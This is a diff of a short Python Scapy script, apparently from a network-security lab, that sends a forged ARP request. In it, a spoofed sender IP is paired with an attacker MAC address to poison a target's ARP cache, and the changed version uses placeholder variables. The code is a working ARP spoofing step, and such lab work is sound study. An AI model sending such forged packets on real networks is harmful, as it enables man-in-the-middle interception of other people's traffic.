@@ -1,8 +1,5 @@
 #!/usr/bin/python3
 from scapy.all import *
-
-E = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast
-A = ARP(op=1, psrc="10.9.0.6", hwsrc="02:42:0a:09:00:99", pdst="10.9.0.5")
-
-pkt = E/A
-sendp(pkt)
+E = Ether(src=MAC_M, dst=MAC_A)
+A = ARP(op=1, psrc=IP_B, hwsrc=MAC_M, pdst=IP_A)
+sendp(E/A, iface="eth0")
